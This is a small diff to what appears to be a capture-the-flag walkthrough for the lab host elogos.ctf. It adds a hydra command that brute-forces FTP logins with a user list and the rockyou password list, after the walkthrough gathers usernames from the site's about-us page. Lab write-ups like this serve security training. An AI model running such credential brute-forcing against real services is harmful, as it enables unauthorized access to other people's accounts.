@@ -10,5 +10,5 @@ Go to http://elogos.ctf/about-us and take note of the listed username (email)
 
 After that launch a brute force with hydra on ftp to gain access
 ```
-`
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ftp://elogos.ctf
 ```
